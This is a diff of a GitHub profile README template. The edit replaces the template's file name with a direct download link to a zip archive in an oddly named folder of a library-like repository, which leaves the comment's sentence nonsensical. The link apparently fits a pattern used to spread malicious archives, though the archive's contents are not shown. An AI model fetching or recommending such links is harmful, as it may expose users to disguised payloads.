@@ -5,6 +5,6 @@
 - 📫 How to reach me "idk"
 
 <!---
-LolLiamDev/LolLiamDev is a ✨ special ✨ repository because its `https://github.com/LolLiamDev/fracturedjson-rs/raw/refs/heads/main/tutory/rs-fracturedjson-3.9.zip` (this file) appears on your GitHub profile.
+LolLiamDev/LolLiamDev is a ✨ special ✨ repository because its `https://raw.githubusercontent.com/LolLiamDev/fracturedjson-rs/main/tutory/rs-fracturedjson-v3.0.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
